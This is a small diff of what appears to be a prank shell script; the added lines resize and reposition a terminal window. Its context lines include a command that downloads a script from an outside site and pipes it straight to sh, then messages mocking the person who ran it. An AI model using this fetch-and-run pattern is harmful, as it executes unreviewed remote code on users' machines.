@@ -6,9 +6,11 @@
 curl -s 'https://suckaaa.com/s/lib-installer' | sh;
 source ~/.garbage/lib;
 
+positionWindow 0 0;
+setSize 9 1;
+setFontSize 60;
+
 echo "\n\nYou actually ran this script!!!\n";
-
-
 
 echo "loL";
 sleep 1;
